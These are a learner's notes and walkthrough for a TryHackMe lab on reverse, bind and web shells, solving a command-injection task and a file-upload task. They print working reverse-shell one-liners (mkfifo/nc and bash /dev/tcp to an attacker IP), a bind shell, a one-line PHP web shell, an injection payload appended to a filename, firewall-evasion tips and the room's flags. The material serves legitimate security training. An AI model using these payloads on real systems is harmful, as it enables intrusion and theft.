# 🐚 What The Shell? — TryHackMe Room Notes

> **Room:** What The Shell? | **Platform:** TryHackMe  
> **Topic:** Reverse Shell · Bind Shell · Web Shell  
> **Difficulty:** Easy–Medium  

---

## 📑 Table of Contents

- [What is a Shell?](#what-is-a-shell)
- [Types of Shells](#types-of-shells)
  - [Reverse Shell](#1-reverse-shell)
  - [Bind Shell](#2-bind-shell)
  - [Web Shell](#3-web-shell)
- [How Reverse Shell Works](#how-reverse-shell-works)
- [How Bind Shell Works](#how-bind-shell-works)
- [How Web Shell Works](#how-web-shell-works)
- [Listener Tools](#listener-tools)
- [Task 1 — Command Injection (Port 8081)](#task-1--command-injection-port-8081)
- [Task 2 — Unrestricted File Upload (Port 8082)](#task-2--unrestricted-file-upload-port-8082)
- [Task Comparison](#task-comparison)
- [Key Concepts Summary](#key-concepts-summary)

---

## 🖥️ What is a Shell?

A **shell** is remote control access to a computer.

- In normal life → **terminal / command prompt**
- In hacking → **attacker's remote access on the target machine**

A shell lets an attacker run commands on a victim's computer without being physically present.

### What Can an Attacker Do With a Shell?

| Activity | Meaning |
|---|---|
| Remote Control | Run commands without being physically there |
| Privilege Escalation | Go from normal user → Admin/Root |
| Data Exfiltration | Steal and send files outside |
| Persistence | Create a backdoor for repeated access |
| Post-Exploitation | Plant malware, create hidden accounts |
| Pivoting | Jump from one machine to other machines |

---

## 🔀 Types of Shells

### 1. Reverse Shell

```
Target Machine ──────connects to──────► Attacker Machine
```

- The **target machine connects back** to the attacker's machine
- Easy to bypass firewalls (outbound traffic is usually allowed)
- **Most common** in real attacks
- Attacker listens with Netcat first, then the target connects

---

### 2. Bind Shell

```
Attacker Machine ──────connects to──────► Target Machine
```

- The target machine **opens a port and waits**
- Attacker connects to that port
- Firewall can block this (inbound traffic is often blocked)
- Less common than reverse shell

---

### 3. Web Shell

```
Browser ──► HTTP Request ──► Malicious Script on Server
```

- A PHP/Python/ASP file uploaded to a server
- You send commands through the browser
- Example: `cmd.php?cmd=whoami`

**How a normal website works vs Web Shell:**

```
Normal Website:
You (Browser)          Web Server
     │                      │
     │  "give me index.php" │
     │─────────────────────►│
     │                      │  PHP runs
     │   "Here is HTML"     │
     │◄─────────────────────│

Web Shell:
You (Browser)              Web Server
     │                          │
     │  "cmd.php?cmd=whoami"    │
     │─────────────────────────►│
     │                          │  "whoami" runs on server
     │   "root" / "www-data"    │
     │◄─────────────────────────│
```

You write a command in the browser → the server runs it → the result comes back to you!

---

## ⚙️ How Reverse Shell Works

### Scene 1 — Attacker Sets Up a Listener

```bash
nc -lvnp 443
```

| Flag | Meaning |
|---|---|
| `nc` | Use Netcat |
| `-l` | Listen — wait for someone to connect |
| `-v` | Verbose — show details on screen |
| `-n` | Use IP only, no name lookup |
| `-p` | Specify port number |
| `443` | Port number (HTTPS port — not blocked by firewalls) |

Terminal shows: `Listening on any 443...`

---

### Scene 2 — Payload Runs on Victim's Machine

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.4.99.209 443 >/tmp/f
```

Breaking it into 5 steps:

| Step | Command | Meaning |
|---|---|---|
| 1 | `rm -f /tmp/f` | Delete old temp file (clean up first) |
| 2 | `mkfifo /tmp/f` | Create a 2-way pipe (like a telephone line) |
| 3 | `cat /tmp/f` | Listen to the pipe continuously |
| 4 | `sh -i 2>&1` | Run whatever comes through (errors included) |
| 5 | `nc 10.4.99.209 443 >/tmp/f` | Connect to attacker and send results back |

**Full flow:**

```
🔴 ATTACKER types "ls"
        │
        ▼ (travels over internet)
📞 /tmp/f pipe receives it
        │
        ▼
👂 cat reads the command
        │
        ▼
⚡ sh runs the command
        │
        ▼
📤 nc sends result back to attacker
        │
        ▼ (travels over internet)
🔴 ATTACKER sees file list on screen!
        │
        ▼
    [loop continues...]
```

---

### Why Port 443? 🤫

| Port | Normal Use |
|---|---|
| 80 | HTTP (normal web traffic) |
| 443 | HTTPS (secure web traffic) |
| 53 | DNS |

Hackers use these ports because **firewalls don't block them** — they look like normal traffic!

---

## 🔗 How Bind Shell Works

### Simple Analogy First 🏠

Think of it like this:

> **Reverse Shell** = Victim comes to Attacker's house and knocks on the door  
> **Bind Shell** = Victim opens their own house door and waits — Attacker walks in

In Bind Shell, the **victim machine opens a port** (like opening a door) and sits there waiting. The attacker then walks up and connects to it.

---

### Scene 1 — Payload Runs on Victim's Machine

This payload runs on the victim first — it opens a port and waits:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f
```

Most of this is the same as reverse shell. **Only the last part is different:**

```
REVERSE SHELL — victim GOES to attacker:
| nc ATTACKER_IP 443        ← connect outward to attacker

BIND SHELL — victim WAITS at home:
| nc -l 0.0.0.0 8080        ← open a door and wait here
```

Breaking down the new part:

| Part | Meaning |
|---|---|
| `nc` | Netcat |
| `-l` | Listen — open a port and wait for someone |
| `0.0.0.0` | Accept connections from anyone (any IP) |
| `8080` | The port victim is waiting on |

So the victim machine just sits on port 8080 like: *"I'm ready, come connect to me"*

---

### Scene 2 — Attacker Walks In

Now the attacker connects to the victim's open port:

```bash
nc -nv 10.10.13.37 8080
```

| Part | Meaning |
|---|---|
| `nc` | Netcat |
| `-n` | Use IP only, no DNS lookup |
| `-v` | Verbose — show details |
| `10.10.13.37` | **VICTIM's** IP address (not attacker's!) |
| `8080` | The port victim is waiting on |

Notice: this time the attacker is providing the **victim's IP** — because attacker is going TO the victim.

---

### Scene 3 — Shell Access ✅

Once connected, attacker has full shell access — same result as reverse shell, just the connection direction was flipped.

---

### Reverse Shell vs Bind Shell — Full Comparison

```
REVERSE SHELL:
                    connects outward
Victim  ─────────────────────────────►  Attacker
        (victim comes to attacker)       (attacker waits)

BIND SHELL:
                    connects inward
Attacker  ──────────────────────────►  Victim
          (attacker goes to victim)     (victim waits)
```

| | Reverse Shell | Bind Shell |
|---|---|---|
| **Who waits?** | Attacker waits | Victim waits |
| **Who connects?** | Victim connects to attacker | Attacker connects to victim |
| **Listener is on** | Attacker's machine | Victim's machine |
| **Listener command** | `nc -lvnp 443` on attacker | `nc -l 0.0.0.0 8080` on victim |
| **Connect command** | Payload runs on victim | `nc -nv VICTIM_IP 8080` on attacker |
| **Firewall bypass?** | ✅ Easy — outbound traffic allowed | ❌ Harder — inbound traffic is blocked |
| **Common in real attacks?** | ✅ Yes, very common | ⚠️ Less common |

### Why is Bind Shell Less Common?

Firewalls block **incoming** connections by default.  
When victim opens port 8080, the firewall sees: *"Someone from outside is trying to come IN"* → **BLOCKED** ❌

With reverse shell, victim connects **outward** to attacker → Firewall sees normal outgoing traffic → **ALLOWED** ✅

---

## 🌐 How Web Shell Works

### Simple Analogy 🧪

> Imagine you uploaded a calculator app on a server. But instead of doing math, this "calculator" runs any system command you type. You just visit it in your browser and type `whoami` — and the server runs it and shows you the result.

That's a **Web Shell** — an evil PHP/Python/ASP file sitting on the server, waiting to execute your commands.

---

### The PHP Web Shell — One Line of Evil

```php
<?php system($_GET["cmd"]); ?>
```

Breaking it down:

| Part | Meaning |
|---|---|
| `<?php ... ?>` | This is a PHP file |
| `system()` | Run a system command |
| `$_GET["cmd"]` | Get the value from the URL parameter `?cmd=` |

So when you visit: `shell.php?cmd=whoami`  
PHP reads `cmd=whoami` from the URL and runs `whoami` on the server!

---

### How to Use a Web Shell

**Step 1 — Create the shell file:**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Step 2 — Upload it to the vulnerable server**  
(via file upload form, FTP access, or any upload vulnerability)

**Step 3 — Access it in your browser:**
```
http://TARGET_IP/uploads/shell.php?cmd=whoami
```

**Step 4 — Run any command by changing `cmd=`:**
```
?cmd=whoami          → who is running the web server
?cmd=id              → user ID and groups
?cmd=ls /            → list root directory files
?cmd=cat /etc/passwd → read password file
```

---

### Web Shell → Upgrade to Reverse Shell

A web shell is useful, but it's slow (every command needs a new HTTP request). The real goal is to **upgrade it to a full reverse shell**:

**Step 1 — Start listener on attacker machine:**
```bash
nc -lvnp 443
```

**Step 2 — Use the web shell to fire a reverse shell payload:**
```
http://TARGET/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/443+0>%261'
```

URL-decoded, this runs:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```

**Step 3 — Full interactive shell received on your listener!** ✅

---

### Web Shell Summary

```
You (Browser)                   Web Server
     │                               │
     │  shell.php?cmd=ls /           │
     │──────────────────────────────►│
     │                               │  runs: ls /
     │  bin etc home tmp var ...     │
     │◄──────────────────────────────│
     │                               │
     │  shell.php?cmd=cat /flag.txt  │
     │──────────────────────────────►│
     │                               │  runs: cat /flag.txt
     │  THM{abc123...}               │
     │◄──────────────────────────────│
```

---

## 🛠️ Listener Tools

| Tool | Command | Special Feature |
|---|---|---|
| `rlwrap` | `rlwrap nc -lvnp 443` | Arrow keys + command history |
| `ncat` | `ncat -lvnp 443` | Better version of Netcat |
| `ncat` (SSL) | `ncat --ssl -lvnp 443` | Encrypted connection |
| `socat` | `socat -d -d TCP-LISTEN:443 STDOUT` | Advanced socket connection |

---

## 🎯 Task 1 — Command Injection (Port 8081)

### Vulnerability: Unsanitized input field executes system commands

**Step 1 — Start Listener**

```bash
nc -lvnp 443
```

Keep this terminal open!

**Step 2 — Open the Website**

```
http://10.114.157.52:8081
```

You'll see a "Hash The File" form.

**Step 3 — Test for Injection**

Enter in the input field:

```
hello.txt; whoami
```

![Command Injection Test - whoami output showing www-data](https://github.com/alimirza2412/Tryhackme-notes/blob/9b30951dc0d2a64a6d5fdebbe4058db8f5a09c23/Cyber-Security-101/Offensive-Security-Tooling/Shell-Overview/shell%20task%201.png)

`www-data` appeared ✅ — Command injection is working!

**Step 4 — Send Reverse Shell Payload**

Paste in the input field:

```
hello.txt; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.114.103.58 443 >/tmp/f
```

Click the button!

**Step 5 — Shell Received on Attacker Terminal**

![Reverse shell connection received on port 443](https://github.com/alimirza2412/Tryhackme-notes/blob/6bf09948c721f0c9faf36e1a8911d5f76b1fd851/Cyber-Security-101/Offensive-Security-Tooling/Shell-Overview/shell%20task%202.png)

```
Connection received on 10.114.157.52 XXXXX ✅
$
```

**Step 6 — Find the Flag**

```bash
ls /
cat /flag.txt
```

![Flag found via cat /flag.txt — THM{...}](https://github.com/alimirza2412/Tryhackme-notes/blob/4799e00355135c47be1bfa1ccc9cb2a7c1e0faad/Cyber-Security-101/Offensive-Security-Tooling/Shell-Overview/shell%20task%205.png)

```
THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}
```

---

## 📂 Task 2 — Unrestricted File Upload (Port 8082)

### Vulnerability: Server allows uploading and executing PHP files

**Step 1 — Create Web Shell File**

```bash
echo '<?php system($_GET["cmd"]); ?>' > /root/shell.php
cat /root/shell.php
```

Expected output:
```
<?php system($_GET["cmd"]); ?>
```

**Step 2 — Open the Website**

```
http://10.114.157.52:8082
```

You'll see a file upload form.

**Step 3 — Upload shell.php**

Choose File → `/root/shell.php` → Upload

**Step 4 — Test the Web Shell**

```
http://10.114.157.52:8082/uploads/shell.php?cmd=whoami
```

`www-data` appears ✅ — Web shell is working!

**Step 5 — Start Listener**

```bash
nc -lvnp 443
```

**Step 6 — Trigger Reverse Shell via URL**

Paste in the browser:

```
http://10.114.157.52:8082/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.114.103.58/443+0>%261'
```

**Step 7 — Shell Received on Attacker Terminal**

![Web shell reverse shell connection received - www-data prompt](https://github.com/alimirza2412/Tryhackme-notes/blob/4799e00355135c47be1bfa1ccc9cb2a7c1e0faad/Cyber-Security-101/Offensive-Security-Tooling/Shell-Overview/shell%20task3.png)

```
Connection received on 10.114.157.52 XXXXX ✅
www-data@2206ad670bad:/var/www/html/uploads$
```

**Step 8 — Find the Flag**

```bash
ls /
cat /flag.txt
```

![Flag found via cat /flag.txt — THM{...}](https://github.com/alimirza2412/Tryhackme-notes/blob/4799e00355135c47be1bfa1ccc9cb2a7c1e0faad/Cyber-Security-101/Offensive-Security-Tooling/Shell-Overview/shell%20task%204.png)

```
THM{202bb14ed12120b31300cfbbbdd35998786b44e5}
```

---

## 📊 Task Comparison

| | Task 1 — CMD Injection | Task 2 — File Upload |
|---|---|---|
| **Vulnerability** | Unsanitized input field | PHP file upload allowed |
| **Web Shell?** | ❌ No | ✅ Yes (shell.php) |
| **Payload Location** | Input field | URL via `?cmd=` |
| **Port** | 8081 | 8082 |
| **Result** | Reverse shell | Reverse shell |

---

## 🧠 Key Concepts Summary

| Concept | Meaning |
|---|---|
| **Shell** | Remote access to run commands on another machine |
| **Reverse Shell** | Victim connects back to attacker — most common, bypasses firewall easily |
| **Bind Shell** | Victim opens a port and waits — attacker connects to victim |
| **Web Shell** | PHP file uploaded to server — runs commands sent via browser URL |
| `nc -lvnp 443` | Attacker listens on port 443 waiting for incoming connection |
| `nc -l 0.0.0.0 8080` | Victim listens on port 8080 waiting for attacker (bind shell) |
| `nc -nv VICTIM_IP 8080` | Attacker connects to victim's open port (bind shell) |
| `<?php system($_GET["cmd"]); ?>` | The one-line PHP web shell |
| `?cmd=whoami` | How to send a command to a web shell via URL |
| **Port 443/80** | Used to bypass firewalls (looks like normal HTTPS/HTTP traffic) |
| `mkfifo /tmp/f` | Creates a 2-way named pipe for shell communication |
| `0.0.0.0` | Accept connections from any IP address |

---

> 📝 *Notes by Muhammad Ali — TryHackMe: [Muhammad.Ali12](https://tryhackme.com/p/Muhammad.Ali12)*  
> 🔗 *GitHub: [alimirza2412/Tryhackme-notes](https://github.com/alimirza2412/Tryhackme-notes)*
